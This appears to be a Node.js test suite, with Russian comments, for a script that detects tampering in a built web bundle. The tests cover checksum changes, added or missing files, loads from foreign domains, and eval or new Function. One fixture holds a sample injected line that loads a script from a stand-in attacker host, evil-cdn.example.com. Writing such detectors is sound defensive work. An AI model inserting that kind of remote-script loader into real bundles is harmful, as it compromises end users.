/**
 * Проверка проверки.
 *
 * Сторож, который молчит всегда, ничем не отличается от отсутствующего, а
 * сторож, который кричит на чистую сборку, — хуже: его перестают читать
 * через неделю. Поэтому здесь и то и другое: чистый каталог должен
 * проходить молча, а каждый вид подмены — находиться отдельно.
 */

import assert from "node:assert/strict";
import test from "node:test";
import { execFileSync } from "node:child_process";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const HERE = dirname(fileURLToPath(import.meta.url));
const SCRIPT = join(HERE, "check-dist.mjs");

const BUNDLE = "assets/index-abc12345.js";
const STYLE = "assets/index-def67890.css";

/** Маленький, но правдоподобный dist. */
function makeDist(overrides = {}) {
  const dir = mkdtempSync(join(tmpdir(), "distcheck-"));
  mkdirSync(join(dir, "assets"));
  const files = {
    "index.html":
      '<!doctype html><html><head><link rel="stylesheet" href="/' +
      STYLE +
      '"><script type="module" src="/' +
      BUNDLE +
      '"></script>' +
      '<script async src="https://telegram.org/js/telegram-web-app.js?63"></script>' +
      "</head><body><div id=root></div></body></html>",
    [BUNDLE]: 'const x=1;fetch("/api/config");',
    [STYLE]: "@import url('https://fonts.googleapis.com/css2?family=Inter');body{margin:0}",
    ...overrides,
  };
  for (const [name, body] of Object.entries(files)) {
    if (body === null) continue;
    writeFileSync(join(dir, name), body);
  }
  return dir;
}

/** Запустить проверку и вернуть вывод с кодом возврата. */
function run(dist, manifest, args = []) {
  try {
    const out = execFileSync("node", [SCRIPT, ...args], {
      env: { ...process.env, DIST_DIR: dist, MANIFEST_FILE: manifest },
      encoding: "utf8",
    });
    return { code: 0, out };
  } catch (error) {
    return { code: error.status, out: `${error.stdout || ""}${error.stderr || ""}` };
  }
}

function withRecorded(overrides) {
  const dir = makeDist();
  const manifest = join(dir, "..", `manifest-${Math.random().toString(36).slice(2)}.json`);
  run(dir, manifest, ["--record"]);
  for (const [name, body] of Object.entries(overrides || {})) {
    if (body === null) rmSync(join(dir, name));
    else writeFileSync(join(dir, name), body);
  }
  return { dir, manifest };
}

test("чистая сборка проходит молча", () => {
  const { dir, manifest } = withRecorded();
  const { code, out } = run(dir, manifest);
  assert.equal(code, 0, out);
  assert.match(out, /Ничего постороннего/);
});

test("дописанный в бандл код виден по контрольной сумме", () => {
  const { dir, manifest } = withRecorded({ [BUNDLE]: 'const x=1;/* тут был чужой */' });
  const { code, out } = run(dir, manifest);
  assert.equal(code, 1);
  assert.match(out, /изменён файл: assets\/index-abc12345\.js/);
});

test("подложенный файл виден, даже если остальные целы", () => {
  const { dir, manifest } = withRecorded({ "assets/tracker.js": "// чужое" });
  const { out } = run(dir, manifest);
  assert.match(out, /лишний файл: assets\/tracker\.js/);
});

test("пропавший файл виден", () => {
  const { dir, manifest } = withRecorded({ [STYLE]: null });
  const { out } = run(dir, manifest);
  assert.match(out, /пропал файл: assets\/index-def67890\.css/);
});

test("загрузка с чужого домена находится", () => {
  const { dir, manifest } = withRecorded({
    [BUNDLE]: 'const s=document.createElement("script");s.src="https://evil-cdn.example.com/a.js";',
  });
  const { out } = run(dir, manifest);
  assert.match(out, /чужой домен .*evil-cdn\.example\.com/);
});

test("свои домены за чужие не принимаются", () => {
  const { dir, manifest } = withRecorded();
  const { out } = run(dir, manifest);
  assert.ok(!/чужой домен/.test(out), out);
});

/* Границы слова в шаблонах — не придирка: без них «Function(» находится
   внутри безобидного execUnsafeLocalFunction( из React, проверка ругается
   на чистую сборку и через неделю её перестают читать. */
test("execUnsafeLocalFunction не принимается за new Function", () => {
  const { dir, manifest } = withRecorded();
  writeFileSync(
    join(dir, "assets/react-like.js"),
    "var a=MSApp.execUnsafeLocalFunction(function(){});var b=evaluate(1);"
  );
  const { out } = run(dir, manifest);
  assert.ok(!/new Function/.test(out), out);
  assert.ok(!/eval\(\)/.test(out), out);
});

test("настоящие eval и new Function находятся", () => {
  const { dir, manifest } = withRecorded({
    [BUNDLE]: 'eval("1");var f=new Function("return 1");',
  });
  const { out } = run(dir, manifest);
  assert.match(out, /eval\(\)/);
  assert.match(out, /new Function\(\)/);
});

test("недовыложенная сборка ловится и без манифеста", () => {
  const dir = makeDist();
  rmSync(join(dir, BUNDLE));
  const { code, out } = run(dir, join(dir, "..", "нет-такого.json"));
  assert.equal(code, 1);
  assert.match(out, /Манифеста нет/);
  assert.match(out, /ссылается на несуществующий assets\/index-abc12345\.js/);
});

test("отсутствие каталога — внятная ошибка, а не трейсбек", () => {
  const { code, out } = run(join(tmpdir(), "нет-такого-каталога"), join(tmpdir(), "нет.json"));
  assert.equal(code, 1);
  assert.match(out, /не найден/);
  assert.ok(!/at Object|node:internal/.test(out), out);
});
